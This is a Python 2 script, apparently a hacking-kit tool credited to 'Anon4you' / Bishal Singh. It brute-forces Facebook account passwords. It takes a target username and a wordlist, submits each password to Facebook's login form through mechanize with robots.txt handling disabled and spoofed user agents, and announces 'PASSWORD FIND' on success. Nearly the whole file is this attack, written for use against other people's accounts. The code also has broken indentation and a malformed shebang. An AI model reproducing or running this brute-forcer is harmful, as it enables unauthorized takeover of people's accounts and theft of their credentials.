#!usr
###################################
#     A tool by Anon4you          #
#     Author : BISHAL SINGH       #
###################################
import os
import sys
import time
import random
import cookielib
import mechanize
os.system("clear")
wd = "\033[90;1m" # dark
GL = "\033[96;1m" # Blue aqua
BB = "\033[34;1m" # Blue light
YY = "\033[33;1m" # Yellow light
GG = "\033[32;1m" # Green light
WW = "\033[0;1m"  # White light
RR = "\033[31;1m" # Red light
CC = "\033[36;1m" # Cyan light
B = "\033[34m"    # Blue
Y = "\033[33;1m"    # Yellow
G = "\033[32m"    # Green
W = "\033[0;1m"     # White
R = "\033[31m"    # Red
C = "\033[36;1m"    # Cyan
P = "\033[35m"
def runntxt(s):
        for anon in s + '\n':
                sys.stdout.write(anon)
                sys.stdout.flush()
                time.sleep(25./2100)
def banner():
    os.system('clear')
os.system('toilet -f mono12 --metal "Brute"')
runntxt('\033[35;1m'+"A tool by"'\033[31m'+" ["'\033[37m'+"Anon"'\033[32m'+"4"'\033[37m'+"You"'\033[31m'+"]")
print " "
runntxt('\033[33;1m'+"Author :"'\033[37;1m'+" Bishal Singh")
print " "
runntxt('\033[32m'+"https://www.github.com/Anon4You")
print " "
print " "
email_target = str(raw_input(GL+"Target usernsme:\033[33m "))
password_list = str(raw_input(GL+"pass.txt:\033[33m "))
print " "
login = 'https://www.facebook.com/login.php?login_attempt=1'
useragents = [('Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0','Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Geck')]

def pil():
                print GG+" "
                g = str(raw_input("[?] Starting Again...\033[93;1m[y/n]: "))
                if g == 'y' or g == 'Y':
                    os.system('python2 brute.py')
                elif g == 'n' or g == 'N':
                    print wd+"Clearing This Process..."
                    sys.exit()
                else:
                    print RR+"Wrong input.."
                    pil()

def edit_wordlist():

        print GG+" "
        ed = str(raw_input("[?] Edit wordlist...? \033[96;1m[y/n]: "))
        if ed == 'y' or ed == 'Y':
                os.system('nano '+password_list)
                pil()
        elif ed == 'n' or ed == 'N':
                print R+"Clearing This Process..."
                sys.exit()

        else:
                print RR+"Wrong input..."
                edit_wordlist()

def main():
        global anon
        anon = mechanize.Browser()
        cj = cookielib.LWPCookieJar()
        anon.set_handle_robots(False)
        anon.set_handle_redirect(True)
        anon.set_cookiejar(cj)
        anon.set_handle_equiv(True)
        anon.set_handle_referer(True)
        anon.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
        runn_anon()
        life()
        print " "
        print RR+" No wordlist matches..."
        print " "


def Anon(Anon_password):
  try:
        sys.stdout.write(GG+"\n[\033[91m+\033[92m]\033[91;1m [\033[97m"+email_target+"\033[91m]\033[32;1m Trying\033[37;1m ==> \033[91m[\033[34;1m"+Anon_password)
        sys.stdout.flush()
        anon.addheaders = [('User-agent', random.choice(useragents))]
        site = anon.open(login)
        anon.select_form(nr = 0)
        anon.form['email'] = email_target
        anon.form['pass'] = Anon_password
        tom = anon.submit()
        mask = tom.geturl()
        if mask != login and (not 'login_attempt' in mask):
                        print " "
                        print ("\033[96m                S U C C E S S")
                        print "          P A S S W O R D  F I N D "
                        print RR+"+-------------------------------------------+"
                        print (RR+"#\033[97m ID / Email Target:\033[92m {}").format(email_target)
                        print (RR+"#\033[97m Password Target:\033[92m {}").format(Anon_password)
                        print " "
                        raw_input(WW+"Press enter to exit...")
                        sys.exit(1)


  except KeyboardInterrupt:
      print wd+"Stop......."
      edit_wordlist()
      sys.exit()
def life():
        global Anon_password
        password_nob = open(password_list, "r")
        for Anon_password in password_nob:
                password_nob = Anon_password.replace("\n","")
                Anon(Anon_password)

def runn_anon():
        global password_list
Anon4You1 = open(password_list, 'r')
Anon4You1 = Anon4You1.readlines()
print GG+"[#] ID / Username Target\033[97;1m: {}".format(email_target)
print GG+"[#] Current password is\033[97;1m:", len(Anon4You1),'password'
print " "
print R+"[#] Cracking please wait\033[97;1m.........."
print " "

if __name__=='__main__':
        main()
